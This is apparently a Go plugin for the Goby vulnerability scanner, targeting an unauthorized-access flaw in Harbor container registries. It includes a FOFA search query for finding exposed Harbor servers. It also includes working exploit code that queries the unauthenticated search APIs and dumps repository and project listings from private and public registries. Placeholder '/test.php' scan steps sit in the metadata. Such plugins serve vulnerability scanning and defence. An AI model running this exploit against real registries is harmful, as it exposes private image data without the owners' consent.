package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Harbor Unauthorized Access Vulnerability",
    "Description": "<p>Harbor is an open source registry open sourced by Harbor. Protect artifacts with policies and role-based access controls, ensure images are scanned and free of vulnerabilities, and sign images as authentic.</p><p>There are security vulnerabilities in Harbor V1.X.X to v2.5.3 and V2.6.0. Attackers can use this vulnerability to access all information of private and public mirror warehouses without authorization and pull mirrors.</p>",
    "Product": "HARBOR",
    "Homepage": "https://github.com/vmware/harbor",
    "DisclosureDate": "2023-01-16",
    "Author": "1291904552@qq.com",
    "FofaQuery": "body=\"harbor.app\" || title==\"Harbor\"",
    "GobyQuery": "body=\"harbor.app\" || title==\"Harbor\"",
    "Level": "2",
    "Impact": "<p>There are security vulnerabilities in Harbor V1.X.X to v2.5.3 and V2.6.0. Attackers can use this vulnerability to access all information of private and public mirror warehouses without authorization and pull mirrors.</p>",
    "Recommendation": "<p>This vulnerability is caused by improper configuration. Users are advised to modify the configuration: uncheck 'Public' in Project Settings'-'Configuration Management'-'Project Repository' to limit public access.</p>",
    "References": [
        "https://github.com/lanqingaa/123/blob/main/README.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "keyword",
            "type": "input",
            "value": "/",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Harbor 未授权访问漏洞",
            "Product": "HARBOR",
            "Description": "<p>Harbor是Harbor开源的一个开源注册表。通过策略和基于角色的访问控制来保护工件，确保图像被扫描并且没有漏洞，并将图像签名为可信的。<br></p><p>Harbor V1.X.X至v2.5.3版本、V2.6.0版本存在安全漏洞，攻击者利用该漏洞可以在未授权的情况下访问私有和公共镜像仓库的所有信息，拉取镜像。<br></p>",
            "Recommendation": "<p>此漏洞为配置不当导致，建议用户修改配置：“项目设置”——“配置管理”——“项目仓库”中的“公开”取消勾选，即可限制公开访问。</p>",
            "Impact": "<p>Harbor V1.X.X至v2.5.3版本、V2.6.0版本存在安全漏洞，攻击者利用该漏洞可以在未授权的情况下访问私有和公共镜像仓库的所有信息，拉取镜像。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Harbor Unauthorized Access Vulnerability",
            "Product": "HARBOR",
            "Description": "<p>Harbor is an open source registry open sourced by Harbor. Protect artifacts with policies and role-based access controls, ensure images are scanned and free of vulnerabilities, and sign images as authentic.<br></p><p>There are security vulnerabilities in Harbor V1.X.X to v2.5.3 and V2.6.0. Attackers can use this vulnerability to access all information of private and public mirror warehouses without authorization and pull mirrors.<br></p>",
            "Recommendation": "<p>This vulnerability is caused by improper configuration. Users are advised to modify the configuration: uncheck 'Public' in Project Settings'-'Configuration Management'-'Project Repository' to limit public access.</p>",
            "Impact": "<p>There are security vulnerabilities in Harbor V1.X.X to v2.5.3 and V2.6.0. Attackers can use this vulnerability to access all information of private and public mirror warehouses without authorization and pull mirrors.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10702"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/api/v2.0/search?q=/"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody,"repository_name")&& strings.Contains(resp1.RawBody,"\"project_id\":"){
					return true
				}

			}
			uri2 := "/api/search?q=/"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody,"repository_name")&& strings.Contains(resp2.RawBody,"\"project_id\":"){
					return true
				}

			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["keyword"].(string)
			uri1 := "/api/v2.0/search?q="+cmd
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 && strings.Contains(resp1.RawBody,"repository_name")&& strings.Contains(resp1.RawBody,"\"project_id\":"){
				expResult.Output = resp1.RawBody
				expResult.Success = true
			}

			uri2 := "/api/search?q="+cmd
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil &&resp2.StatusCode == 200 && strings.Contains(resp2.RawBody,"repository_name")&& strings.Contains(resp2.RawBody,"\"project_id\":"){
				expResult.Output = resp2.RawBody
				expResult.Success = true

			}
			return expResult
		},
	))
}